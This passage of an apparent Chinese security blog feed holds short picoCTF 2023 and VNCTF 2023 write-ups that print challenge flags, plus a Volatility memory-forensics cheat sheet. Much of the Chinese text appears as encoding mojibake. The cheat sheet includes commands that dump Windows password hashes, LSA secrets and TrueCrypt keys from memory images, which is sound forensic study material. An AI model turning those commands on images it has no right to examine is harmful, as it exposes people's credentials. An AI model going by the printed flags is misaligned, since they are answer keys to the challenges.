alt="image-20230327204642026"></p><p>på¼€å¤´ Fç»“å°¾</p><table><thead><tr><th><a href="https://www.runoob.com/jsref/jsref-regexp-ncaret.html">^n</a></th><th>åŒ¹é…ä»»ä½•å¼€å¤´ä¸º n çš„å­—ç¬¦ä¸²ã€‚</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/images/2023picoctf/image-20230327204620651.png" alt="image-20230327204620651"></p><p>flag:picoCTF{succ3ssfully_matchtheregex_0694f25b}</p><h4 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h4><h4 id="money-ware"><a href="#money-ware" class="headerlink" title="money-ware"></a>money-ware</h4><p>Flag format: picoCTF{Malwarename}The first letter of the malware name should be capitalized and the rest lowercase.Your friend just got hacked and has been asked to pay some bitcoins to <code>1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX</code>. He doesnâ€™t seem to understand what is going on and asks you for advice. Can you identify what malware heâ€™s being a victim of?</p><p>æ ‡è®°æ ¼å¼ï¼špicoCTF{Malwarename}<br>æ¶æ„è½¯ä»¶åç§°çš„é¦–å­—æ¯åº”å¤§å†™ï¼Œå…¶ä½™å­—æ¯å°å†™ã€‚<br>æ‚¨çš„æœ‹å‹åˆšåˆšè¢«é»‘å®¢å…¥ä¾µï¼Œå¹¶è¢«è¦æ±‚å‘ 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX æ”¯ä»˜ä¸€äº›æ¯”ç‰¹å¸ã€‚ ä»–ä¼¼ä¹ä¸æ˜ç™½å‘ç”Ÿäº†ä»€ä¹ˆï¼Œå¹¶å‘ä½ å¾æ±‚æ„è§ã€‚ ä½ èƒ½ç¡®å®šä»–æ˜¯å“ªç§æ¶æ„è½¯ä»¶çš„å—å®³è€…å—ï¼Ÿ</p><p><img src="/images/2023picoctf/image-20230327222153657.png" alt="image-20230327222153657"></p><p>flag:picoCTF{Petya}</p><h4 id="repetitions"><a href="#repetitions" class="headerlink" title="repetitions"></a>repetitions</h4><p>ä¸‹è½½æ–‡ä»¶ï¼Œæ‹–åˆ°ida</p><p><img src="/images/2023picoctf/image-20230327224136231.png" alt="image-20230327224136231"></p><p>base64 å¤šè§£å‡ æ¬¡</p><p><img src="/images/2023picoctf/image-20230327224302506.png" alt="image-20230327224302506"></p><p>flag:picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_9b59b35c}</p><h4 id="rule"><a href="#rule" class="headerlink" title="rule"></a>rule</h4><p><img src="/images/2023picoctf/image-20230327224727627.png" alt="image-20230327224727627"></p><p>flag:picoCTF{h34rd_und3r5700d_4ck_cba1c711}</p><h4 id="FindAndOpen"><a href="#FindAndOpen" class="headerlink" title="FindAndOpen"></a>FindAndOpen</h4><p>ä¸‹è½½pacpåŒ…ï¼Œä¸­é—´æœ‰ä¸ªbaseè§£ä¸€ä¸‹</p><p>è¿™ä¸ªæ˜¯ä¸‹é¢å‹ç¼©åŒ…çš„å¯†ç </p><p>å†è§£ä¸€ä¸‹ï¼Œå°±å¯ä»¥äº†</p><p><img src="/images/2023picoctf/image-20230328162924061.png" alt="image-20230328162924061"></p><p>picoCTF{R34DING_LOKd_fil56_succ3ss_419835ef}</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h3 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h3><p>ç›´æ¥æ‹–åˆ°idaé‡Œ</p><h3 id="safe-opener2"><a href="#safe-opener2" class="headerlink" title="safe opener2"></a>safe opener2</h3><p>ç›´æ¥æ‹–åˆ°ida</p><h3 id="timer"><a href="#timer" class="headerlink" title="timer"></a>timer</h3><p>æ‹–åˆ°Androidkillé‡Œ</p><p>æ‰¾åˆ°buildconfigæ–‡ä»¶å³å¯</p><p><img src="/images/2023picoctf/image-20230328205729022.png" alt="image-20230328205729022"></p><p>flag:picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2023</title>
      <link href="/2023/02/18/VNCTF2023/"/>
      <url>/2023/02/18/VNCTF2023/</url>
      
        <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="è±¡æ£‹ç‹å­"><a href="#è±¡æ£‹ç‹å­" class="headerlink" title="è±¡æ£‹ç‹å­"></a>è±¡æ£‹ç‹å­</h4><p>é¡¾åæ€ä¹‰ï¼Œåº”è¯¥æ˜¯ä¸‹è±¡æ£‹çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä¸‹ï¼Œå¤ªèœäº†ï¼Œjsç›´æ¥ç¿»<br><a href="http://236f7cc1-466c-4d47-abf8-21b4ffc92cf7.node4.buuoj.cn:81/js/play.js">http://236f7cc1-466c-4d47-abf8-21b4ffc92cf7.node4.buuoj.cn:81/js/play.js</a><br>åœ¨play.jsä¸­  ä¸‹é¢æœ‰jsfuck</p><p><img src="/images/others/image-20230218114910836.png" alt="image-20230218114910836"></p><p><img src="/images/others/image-20230218114953833.png" alt="image-20230218114953833"></p><p>ç›´æ¥å¤åˆ¶æ‰€æœ‰ï¼Œåˆ°æµè§ˆå™¨consoleä¸­ï¼Œå³å¯</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>volatilityå¸¸ç”¨å‘½ä»¤</title>
      <link href="/2023/02/17/volatility%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/02/17/volatility%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4</span><br><span class="line">https://blog.csdn.net/u011250160/article/details/120473177</span><br></pre></td></tr></table></figure><h3 id="volatility2"><a href="#volatility2" class="headerlink" title="volatility2"></a>volatility2</h3><h4 id="å¸¸ç”¨æ¨¡å—"><a href="#å¸¸ç”¨æ¨¡å—" class="headerlink" title="å¸¸ç”¨æ¨¡å— #"></a>å¸¸ç”¨æ¨¡å— <a href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97">#</a></h4><table><thead><tr><th><strong>æ’ä»¶åç§°</strong></th><th><strong>åŠŸèƒ½</strong></th></tr></thead><tbody><tr><td>amcache</td><td>æŸ¥çœ‹AmCacheåº”ç”¨ç¨‹åºç—•è¿¹ä¿¡æ¯</td></tr><tr><td>apihooks</td><td>æ£€æµ‹å†…æ ¸åŠè¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­çš„API hook</td></tr><tr><td>atoms</td><td>åˆ—å‡ºä¼šè¯åŠçª—å£ç«™atomè¡¨</td></tr><tr><td>atomscan</td><td>Atomè¡¨çš„æ± æ‰«æ(Pool scanner)</td></tr><tr><td>auditpol</td><td>åˆ—å‡ºæ³¨å†Œè¡¨HKLMSECURITYPolicyPolAdtEvçš„å®¡è®¡ç­–ç•¥ä¿¡æ¯</td></tr><tr><td>bigpools</td><td>ä½¿ç”¨BigPagePoolScannerè½¬å‚¨å¤§åˆ†é¡µæ± (big page pools)</td></tr><tr><td>bioskbd</td><td>ä»å®æ—¶æ¨¡å¼å†…å­˜ä¸­è¯»å–é”®ç›˜ç¼“å†²æ•°æ®(æ—©æœŸç”µè„‘å¯ä»¥è¯»å–å‡ºBIOSå¼€æœºå¯†ç )</td></tr><tr><td>cachedump</td><td>è·å–å†…å­˜ä¸­ç¼“å­˜çš„åŸŸå¸å·çš„å¯†ç å“ˆå¸Œ</td></tr><tr><td>callbacks</td><td>æ‰“å°å…¨ç³»ç»Ÿé€šçŸ¥ä¾‹ç¨‹</td></tr><tr><td>clipboard</td><td>æå–Windowså‰ªè´´æ¿ä¸­çš„å†…å®¹</td></tr><tr><td>cmdline</td><td>æ˜¾ç¤ºè¿›ç¨‹å‘½ä»¤è¡Œå‚æ•°</td></tr><tr><td>cmdscan</td><td>æå–æ‰§è¡Œçš„å‘½ä»¤è¡Œå†å²è®°å½•ï¼ˆæ‰«æ_COMMAND_HISTORYä¿¡æ¯ï¼‰</td></tr><tr><td>connections</td><td>æ‰“å°ç³»ç»Ÿæ‰“å¼€çš„ç½‘ç»œè¿æ¥(ä»…æ”¯æŒWindows XP å’Œ2003)</td></tr><tr><td>connscan</td><td>æ‰“å°TCPè¿æ¥ä¿¡æ¯</td></tr><tr><td>consoles</td><td>æå–æ‰§è¡Œçš„å‘½ä»¤è¡Œå†å²è®°å½•ï¼ˆæ‰«æ_CONSOLE_INFORMATIONä¿¡æ¯ï¼‰</td></tr><tr><td>crashinfo</td><td>æå–å´©æºƒè½¬å‚¨ä¿¡æ¯</td></tr><tr><td>deskscan</td><td>tagDESKTOPæ± æ‰«æ(Poolscaner)</td></tr><tr><td>devicetree</td><td>æ˜¾ç¤ºè®¾å¤‡æ ‘ä¿¡æ¯</td></tr><tr><td>dlldump</td><td>ä»è¿›ç¨‹åœ°å€ç©ºé—´è½¬å‚¨åŠ¨æ€é“¾æ¥åº“</td></tr><tr><td>dlllist</td><td>æ‰“å°æ¯ä¸ªè¿›ç¨‹åŠ è½½çš„åŠ¨æ€é“¾æ¥åº“åˆ—è¡¨</td></tr><tr><td>driverirp</td><td>IRP hooké©±åŠ¨æ£€æµ‹</td></tr><tr><td>drivermodule</td><td>å…³è”é©±åŠ¨å¯¹è±¡è‡³å†…æ ¸æ¨¡å—</td></tr><tr><td>driverscan</td><td>é©±åŠ¨å¯¹è±¡æ± æ‰«æ</td></tr><tr><td>dumpcerts</td><td>æå–RASç§é’¥åŠSSLå…¬é’¥</td></tr><tr><td>dumpfiles</td><td>æå–å†…å­˜ä¸­æ˜ å°„æˆ–ç¼“å­˜çš„æ–‡ä»¶</td></tr><tr><td>dumpregistry</td><td>è½¬å‚¨å†…å­˜ä¸­æ³¨å†Œè¡¨ä¿¡æ¯è‡³ç£ç›˜</td></tr><tr><td>editbox</td><td>æŸ¥çœ‹Editç¼–è¾‘æ§ä»¶ä¿¡æ¯ (Listboxæ­£åœ¨å®éªŒä¸­)</td></tr><tr><td>envars</td><td>æ˜¾ç¤ºè¿›ç¨‹çš„ç¯å¢ƒå˜é‡</td></tr><tr><td>eventhooks</td><td>æ‰“å°Windowsäº‹ä»¶hookè¯¦ç»†ä¿¡æ¯</td></tr><tr><td>evtlogs</td><td>æå–Windowsäº‹ä»¶æ—¥å¿—ï¼ˆä»…æ”¯æŒXP/2003)</td></tr><tr><td>filescan</td><td>æå–æ–‡ä»¶å¯¹è±¡ï¼ˆfile objectsï¼‰æ± ä¿¡æ¯</td></tr><tr><td>gahti</td><td>è½¬å‚¨ç”¨æˆ·å¥æŸ„ï¼ˆhandleï¼‰ç±»å‹ä¿¡æ¯</td></tr><tr><td>gditimers</td><td>æ‰“å°å·²å®‰è£…çš„GDIè®¡æ—¶å™¨(timers)åŠå›è°ƒ(callbacks)</td></tr><tr><td>gdt</td><td>æ˜¾ç¤ºå…¨å±€æè¿°ç¬¦è¡¨(Global Deor Table)</td></tr><tr><td>getservicesids</td><td>è·å–æ³¨å†Œè¡¨ä¸­çš„æœåŠ¡åç§°å¹¶è¿”å›SIDä¿¡æ¯</td></tr><tr><td>getsids</td><td>æ‰“å°æ¯ä¸ªè¿›ç¨‹çš„SIDä¿¡æ¯</td></tr><tr><td>handles</td><td>æ‰“å°æ¯ä¸ªè¿›ç¨‹æ‰“å¼€çš„å¥æŸ„çš„åˆ—è¡¨</td></tr><tr><td>hashdump</td><td>è½¬å‚¨å†…å­˜ä¸­çš„Windowså¸æˆ·å¯†ç å“ˆå¸Œ(LM/NTLM)</td></tr><tr><td>hibinfo</td><td>è½¬å‚¨ä¼‘çœ æ–‡ä»¶ä¿¡æ¯</td></tr><tr><td>hivedump</td><td>æ‰“å°æ³¨å†Œè¡¨é…ç½®å•å…ƒä¿¡æ¯</td></tr><tr><td>hivelist</td><td>æ‰“å°æ³¨å†Œè¡¨é…ç½®å•å…ƒåˆ—è¡¨</td></tr><tr><td>hivescan</td><td>æ³¨å†Œè¡¨é…ç½®å•å…ƒæ± æ‰«æ</td></tr><tr><td>hpakextract</td><td>ä»HPAKæ–‡ä»¶ï¼ˆFast Dumpæ ¼å¼ï¼‰æå–ç‰©ç†å†…å­˜æ•°æ®</td></tr><tr><td>hpakinfo</td><td>æŸ¥çœ‹HPAKæ–‡ä»¶å±æ€§åŠç›¸å…³ä¿¡æ¯</td></tr><tr><td>idt</td><td>æ˜¾ç¤ºä¸­æ–­æè¿°ç¬¦è¡¨(Interrupt Deor Table)</td></tr><tr><td>iehistory</td><td>é‡å»ºIEç¼“å­˜åŠè®¿é—®å†å²è®°å½•</td></tr><tr><td>imagecopy</td><td>å°†ç‰©ç†åœ°å€ç©ºé—´å¯¼å‡ºåŸç”ŸDDé•œåƒæ–‡ä»¶</td></tr><tr><td>imageinfo</td><td>æŸ¥çœ‹/è¯†åˆ«é•œåƒä¿¡æ¯</td></tr><tr><td>impscan</td><td>æ‰«æå¯¹å¯¼å…¥å‡½æ•°çš„è°ƒç”¨</td></tr><tr><td>joblinks</td><td>æ‰“å°è¿›ç¨‹ä»»åŠ¡é“¾æ¥ä¿¡æ¯</td></tr><tr><td>kdbgscan</td><td>æœç´¢å’Œè½¬å‚¨æ½œåœ¨KDBGå€¼</td></tr><tr><td>kpcrscan</td><td>æœç´¢å’Œè½¬å‚¨æ½œåœ¨KPCRå€¼</td></tr><tr><td>ldrmodules</td><td>æ£€æµ‹æœªé“¾æ¥çš„åŠ¨æ€é“¾æ¥DLL</td></tr><tr><td>lsadump</td><td>ä»æ³¨å†Œè¡¨ä¸­æå–LSAå¯†é’¥ä¿¡æ¯ï¼ˆå·²è§£å¯†ï¼‰</td></tr><tr><td>machoinfo</td><td>è½¬å‚¨Mach-O æ–‡ä»¶æ ¼å¼ä¿¡æ¯</td></tr><tr><td>malfind</td><td>æŸ¥æ‰¾éšè—çš„å’Œæ’å…¥çš„ä»£ç </td></tr><tr><td>mbrparser</td><td>æ‰«æå¹¶è§£ææ½œåœ¨çš„ä¸»å¼•å¯¼è®°å½•(MBR)</td></tr><tr><td>memdump</td><td>è½¬å‚¨è¿›ç¨‹çš„å¯å¯»å€å†…å­˜</td></tr><tr><td>memmap</td><td>æ‰“å°å†…å­˜æ˜ å°„</td></tr><tr><td>messagehooks</td><td>æ¡Œé¢å’Œçª—å£æ¶ˆæ¯é’©å­çš„çº¿ç¨‹åˆ—è¡¨</td></tr><tr><td>mftparser</td><td>æ‰«æå¹¶è§£ææ½œåœ¨çš„MFTæ¡ç›®</td></tr><tr><td>moddump</td><td>è½¬å‚¨å†…æ ¸é©±åŠ¨ç¨‹åºåˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„ç¤ºä¾‹</td></tr><tr><td>modscan</td><td>å†…æ ¸æ¨¡å—æ± æ‰«æ</td></tr><tr><td>modules</td><td>æ‰“å°åŠ è½½æ¨¡å—çš„åˆ—è¡¨</td></tr><tr><td>multiscan</td><td>æ‰¹é‡æ‰«æå„ç§å¯¹è±¡</td></tr><tr><td>mutantscan</td><td>å¯¹äº’æ–¥å¯¹è±¡æ± æ‰«æ</td></tr><tr><td>notepad</td><td>æŸ¥çœ‹è®°äº‹æœ¬å½“å‰æ˜¾ç¤ºçš„æ–‡æœ¬</td></tr><tr><td>objtypescan</td><td>æ‰«æçª—å£å¯¹è±¡ç±»å‹å¯¹è±¡</td></tr><tr><td>patcher</td><td>åŸºäºé¡µé¢æ‰«æçš„è¡¥ä¸ç¨‹åºå†…å­˜</td></tr><tr><td>poolpeek</td><td>å¯é…ç½®çš„æ± æ‰«æå™¨æ’ä»¶</td></tr><tr><td>printkey</td><td>æ‰“å°æ³¨å†Œè¡¨é¡¹åŠå…¶å­é¡¹å’Œå€¼</td></tr><tr><td>privs</td><td>æ˜¾ç¤ºè¿›ç¨‹æƒé™</td></tr><tr><td>procdump</td><td>è¿›ç¨‹è½¬å‚¨åˆ°ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ç¤ºä¾‹</td></tr><tr><td>pslist</td><td>æŒ‰ç…§EPROCESSåˆ—è¡¨æ‰“å°æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</td></tr><tr><td>psscan</td><td>è¿›ç¨‹å¯¹è±¡æ± æ‰«æ</td></tr><tr><td>pstree</td><td>ä»¥æ ‘å‹æ–¹å¼æ‰“å°è¿›ç¨‹åˆ—è¡¨</td></tr><tr><td>psxview</td><td>æŸ¥æ‰¾å¸¦æœ‰éšè—è¿›ç¨‹çš„æ‰€æœ‰è¿›ç¨‹åˆ—è¡¨</td></tr><tr><td>qemuinfo</td><td>è½¬å‚¨Qemu ä¿¡æ¯</td></tr><tr><td>raw2dmp</td><td>å°†ç‰©ç†å†…å­˜åŸç”Ÿæ•°æ®è½¬æ¢ä¸ºwindbgå´©æºƒè½¬å‚¨æ ¼å¼</td></tr><tr><td>screenshot</td><td>åŸºäºGDI Windowsçš„è™šæ‹Ÿå±å¹•æˆªå›¾ä¿å­˜</td></tr><tr><td>servicediff</td><td>WindowsæœåŠ¡åˆ—è¡¨(ala Plugx)</td></tr><tr><td>sessions</td><td>_MM_SESSION_SPACEçš„è¯¦ç»†ä¿¡æ¯åˆ—è¡¨(ç”¨æˆ·ç™»å½•ä¼šè¯)</td></tr><tr><td>shellbags</td><td>æ‰“å°Shellbagsä¿¡æ¯</td></tr><tr><td>shimcache</td><td>è§£æåº”ç”¨ç¨‹åºå…¼å®¹æ€§Shimç¼“å­˜æ³¨å†Œè¡¨é¡¹</td></tr><tr><td>shutdowntime</td><td>ä»å†…å­˜ä¸­çš„æ³¨å†Œè¡¨ä¿¡æ¯è·å–æœºå™¨å…³æœºæ—¶é—´</td></tr><tr><td>sockets</td><td>æ‰“å°å·²æ‰“å¼€å¥—æ¥å­—åˆ—è¡¨</td></tr><tr><td>sockscan</td><td>TCPå¥—æ¥å­—å¯¹è±¡æ± æ‰«æ</td></tr><tr><td>ssdt</td><td>æ˜¾ç¤ºSSDTæ¡ç›®</td></tr><tr><td>strings</td><td>ç‰©ç†åˆ°è™šæ‹Ÿåœ°å€çš„åç§»åŒ¹é…(éœ€è¦ä¸€äº›æ—¶é—´ï¼Œå¸¦è¯¦ç»†ä¿¡æ¯)</td></tr><tr><td>svcscan</td><td>WindowsæœåŠ¡åˆ—è¡¨æ‰«æ</td></tr><tr><td>symlinkscan</td><td>ç¬¦å·é“¾æ¥å¯¹è±¡æ± æ‰«æ</td></tr><tr><td>thrdscan</td><td>çº¿ç¨‹å¯¹è±¡æ± æ‰«æ</td></tr><tr><td>threads</td><td>è°ƒæŸ¥_ETHREAD å’Œ_KTHREADs</td></tr><tr><td>timeliner</td><td>åˆ›å»ºå†…å­˜ä¸­çš„å„ç§ç—•è¿¹ä¿¡æ¯çš„æ—¶é—´çº¿</td></tr><tr><td>timers</td><td>æ‰“å°å†…æ ¸è®¡æ—¶å™¨åŠå…³è”æ¨¡å—çš„DPC</td></tr><tr><td>truecryptmaster</td><td>æ¢å¤TrueCrypt 7.1aä¸»å¯†é’¥</td></tr><tr><td>truecryptpassphrase</td><td>æŸ¥æ‰¾å¹¶æå–TrueCryptå¯†ç </td></tr><tr><td>truecryptsummary</td><td>TrueCryptæ‘˜è¦ä¿¡æ¯</td></tr><tr><td>unloadedmodules</td><td>æ‰“å°å¸è½½çš„æ¨¡å—ä¿¡æ¯åˆ—è¡¨</td></tr><tr><td>userassist</td><td>æ‰“å°æ³¨å†Œè¡¨ä¸­UserAssistç›¸å…³ä¿¡æ¯</td></tr><tr><td>userhandles</td><td>è½¬å‚¨ç”¨æˆ·å¥æŸ„è¡¨</td></tr><tr><td>vaddump</td><td>è½¬å‚¨VADæ•°æ®ä¸ºæ–‡ä»¶</td></tr><tr><td>vadinfo</td><td>è½¬å‚¨VADä¿¡æ¯</td></tr><tr><td>vadtree</td><td>ä»¥æ ‘å½¢æ–¹å¼æ˜¾ç¤ºVADæ ‘ä¿¡æ¯</td></tr><tr><td>vadwalk</td><td>æ˜¾ç¤ºéå†VADæ ‘</td></tr><tr><td>vboxinfo</td><td>è½¬å‚¨Virtualboxä¿¡æ¯ï¼ˆè™šæ‹Ÿæœºï¼‰</td></tr><tr><td>verinfo</td><td>æ‰“å°PEé•œåƒä¸­çš„ç‰ˆæœ¬ä¿¡æ¯</td></tr><tr><td>vmwareinfo</td><td>è½¬å‚¨VMware VMSS/VMSN ä¿¡æ¯</td></tr><tr><td>volshell</td><td>å†…å­˜é•œåƒä¸­çš„shell</td></tr><tr><td>windows</td><td>æ‰“å°æ¡Œé¢çª—å£(è¯¦ç»†ä¿¡æ¯)</td></tr><tr><td>wintree</td><td>Zé¡ºåºæ‰“å°æ¡Œé¢çª—å£æ ‘</td></tr><tr><td>wndscan</td><td>æ± æ‰«æçª—å£ç«™</td></tr><tr><td>yarascan</td><td>ä»¥Yaraç­¾åæ‰«æè¿›ç¨‹æˆ–å†…æ ¸å†…å­˜</td></tr></tbody></table><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤ #"></a>å¸¸ç”¨å‘½ä»¤ <a href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4">#</a></h3><table><thead><tr><th><strong>åŠŸèƒ½</strong></th><th><strong>å‘½ä»¤è¡ŒåŠå‚æ•°</strong></th></tr></thead><tbody><tr><td>æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 pslist</td></tr><tr><td>æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨ï¼ˆæ ‘å½¢ï¼‰</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 pstree</td></tr><tr><td>æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨(psxè§†å›¾)</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 psxview</td></tr><tr><td>æŸ¥çœ‹ç½‘ç»œé€šè®¯è¿æ¥</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 netscan</td></tr><tr><td>æŸ¥çœ‹åŠ è½½çš„åŠ¨æ€é“¾æ¥åº“</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 dlllist</td></tr><tr><td>æŸ¥çœ‹SSDTè¡¨</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 ssdt</td></tr><tr><td>æŸ¥çœ‹UserAssistç—•è¿¹</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 userassist</td></tr><tr><td>æŸ¥çœ‹ShimCacheç—•è¿¹</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 shimcache</td></tr><tr><td>æŸ¥çœ‹ShellBags</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 shellbags</td></tr><tr><td>æŸ¥çœ‹æœåŠ¡åˆ—è¡¨</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 svcscan</td></tr><tr><td>æŸ¥çœ‹Windowså¸æˆ·hash</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 hashdump</td></tr><tr><td>æŸ¥çœ‹æœ€åå…³æœºæ—¶é—´</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 shutdowntime</td></tr><tr><td>æŸ¥çœ‹IEå†å²è®°å½•</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 iehistory</td></tr><tr><td>æå–æ³¨å†Œè¡¨æ•°æ®</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 dumpregistry</td></tr><tr><td>è§£æMFTè®°å½•</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 mftparser</td></tr><tr><td>å¯¼å‡ºMFTè®°å½•,æ¢å¤æ–‡ä»¶</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 mftparser â€“output-file=mftverbose.txt -D mftoutput</td></tr><tr><td>è·å–TrueCryptå¯†é’¥ä¿¡æ¯</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 truecryptmaster</td></tr><tr><td>è·å–TrueCryptå¯†ç ä¿¡æ¯</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 truecryptpassphras</td></tr></tbody></table><h4 id="Volatility3"><a href="#Volatility3" class="headerlink" title="Volatility3"></a>Volatility3</h4><p>banners.Banners<br>è¯†åˆ«linuxé•œåƒçš„bannerä¿¡æ¯<br>ä¸è¯†åˆ«windowsçš„é•œåƒ</p><p>isfinfo.IsfInfo<br>ç¡®å®šå½“å‰å¯ç”¨çš„ISFæ–‡ä»¶<br>å…·ä½“ä»€ä¹ˆæ˜¯ISFæ–‡ä»¶ï¼Œæˆ‘ä¹Ÿæ²¡æŸ¥åˆ°<br>å¦‚ä¸‹</p><p>layerwriter.LayerWriter<br>Runs the automagics and writes out the primary layer produced by the stacker.<br>è¿è¡Œ automagics å¹¶å†™å‡ºå †æ ˆå™¨äº§ç”Ÿçš„ä¸»å±‚</p><p>timeliner.Timeliner<br>Runs all relevant plugins that provide time related information and orders the results by time.<br>è¿è¡Œæ‰€æœ‰æä¾›æ—¶é—´ç›¸å…³ä¿¡æ¯å¹¶æŒ‰æ—¶é—´æ’åºç»“æœçš„ç›¸å…³æ’ä»¶ï¼Œç®€ç§°ï¼Œå…¨è‡ªåŠ¨æ´—è¡£æœº</p><p>windows.cachedump.Cachedump<br>Dumps lsa secrets from memory<br>ä»å†…å­˜ä¸­è½¬å‚¨ lsa å¯†ç <br>æˆ‘è¿™æ˜¯è½¬å‚¨å¤±è´¥äº†</p><p>windows.callbacks.Callbacks<br>Lists kernel callbacks and notification routines.<br>åˆ—å‡ºå†…æ ¸å›è°ƒå’Œé€šçŸ¥ä¾‹ç¨‹</p><p>windows.cmdline.CmdLine<br>Lists process command line arguments.<br>åˆ—å‡ºè¿›ç¨‹å‘½ä»¤è¡Œå‚æ•°</p><p>windows.crashinfo.Crashinfo<br>windows.dlllist.DllList<br>Lists the loaded modules in a particular windows memory image.<br>åˆ—å‡ºåŠ è½½çš„dll</p><p>windows.driverirp.DriverIrp<br>List IRPs for drivers in a particular windows memory image.<br>åˆ—å‡ºWindows é•œåƒä¸­é©±åŠ¨ç¨‹åºçš„ IRP</p><p>windows.driverscan.DriverScan<br>Scans for drivers present in a particular windows memory image.<br>æ‰«æå­˜åœ¨äº Windows é•œåƒä¸­çš„é©±åŠ¨ç¨‹åº</p><p>windows.dumpfiles.DumpFiles<br>Dumps cached file contents from Windows memory samples.<br>ä» Windows å†…å­˜ä¸­è½¬å‚¨ç¼“å­˜çš„æ–‡ä»¶å†…å®¹ï¼Œæ–‡ä»¶å¤¹è¦çˆ†äº†</p><p>windows.envars.Envars<br>Display process environment variables<br>æ˜¾ç¤ºè¿›ç¨‹ç¯å¢ƒå˜é‡</p><p>windows.filescan.FileScan<br>Scans for file objects present in a particular windows memory image.<br>æ‰«ææ–‡ä»¶</p><p>windows.getservicesids.GetServiceSIDs<br>Lists process token sids.</p><p>windows.getsids.GetSIDs<br>Print the SIDs owning each process<br>åˆ—å‡ºæ¯ä¸ªè¿›ç¨‹çš„sid</p><p>windows.handles.Handles<br>Lists process open handles.<br>åˆ—å‡ºè¿›ç¨‹æ‰“å¼€çš„å¥æŸ„</p><p>windows.hashdump.Hashdump<br>Dumps user hashes from memory<br>è·å–å“ˆå¸Œ</p><p>windows.info.Info<br>Show OS &amp; kernel details of the memory sample being analyzed.<br>è·å–ç³»ç»Ÿå†…æ ¸ä¿¡æ¯</p><p>windows.lsadump.Lsadump<br>Dumps lsa secrets from memory<br>ä»å†…å­˜ä¸­è½¬å‚¨ lsa å¯†ç <br>å’Œcachedumpä¸€æ ·çš„è§£é‡Šï¼Œä½†æ˜¯æ‰§è¡Œçš„ç»“æœå´ä¸ä¸€æ ·</p><p>windows.malfind.Malfind<br>Lists process memory ranges that potentially contain injected code.<br>åˆ—å‡ºå¯èƒ½åŒ…å«æ³¨å…¥ä»£ç çš„è¿›ç¨‹å†…å­˜èŒƒå›´</p><p>windows.memmap.Memmap<br>Prints the memory map<br>æ‰“å°å†…å­˜æ˜ å°„</p><p>windows.modscan.ModScan<br>Scans for modules present in a particular windows memory image.<br>æ‰«æ Windows å†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„æ¨¡å—</p><p>windows.modules.Modules<br>Lists the loaded kernel modules.<br>åˆ—å‡ºåŠ è½½çš„å†…æ ¸æ¨¡å—</p><p>windows.mutantscan.MutantScan<br>Scans for mutexes present in a particular windows memory image.<br>æ‰«æç‰¹å®š Windows å†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„äº’æ–¥é”ï¼Œæ¸¸æˆå¤šå¼€ç”¨çš„å°±æ˜¯mutex</p><p>windows.netscan.NetScan<br>Scans for network objects present in a particular windows memory image.<br>æ‰«æå­˜åœ¨äº Windows å†…å­˜æ˜ åƒä¸­çš„ç½‘ç»œå¯¹è±¡</p><p>windows.netstat.NetStat<br>Traverses network tracking structures present in a particular windows memory image.<br>éå† Windows 